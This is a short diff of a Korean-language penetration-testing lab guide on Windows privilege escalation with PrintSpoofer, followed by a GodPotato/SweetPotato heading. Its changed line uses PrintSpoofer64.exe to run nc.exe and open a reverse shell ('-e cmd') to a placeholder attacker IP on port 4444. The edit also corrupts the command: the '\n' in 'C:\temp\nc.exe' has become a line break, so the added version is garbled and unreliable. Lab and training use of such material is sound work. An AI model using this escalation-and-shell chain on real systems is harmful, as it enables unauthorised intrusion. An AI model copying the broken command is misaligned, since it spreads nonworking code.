@@ -34,7 +34,8 @@ C:\temp\PrintSpoofer64.exe -i -c "whoami"
 ### 실전 리버스쉘 (KALI_IP는 본인 IP로 교체)
 
 ```powershell
-C:\temp\PrintSpoofer64.exe -i -c "C:\temp\nc.exe 192.168.x.x 4444 -e cmd"
+C:\temp\PrintSpoofer64.exe -i -c "C:\temp
+c.exe 192.168.x.x 4444 -e cmd"
 ```
 
 ## 4. 실습: GodPotato / SweetPotato (신 서버, 2012~2022)
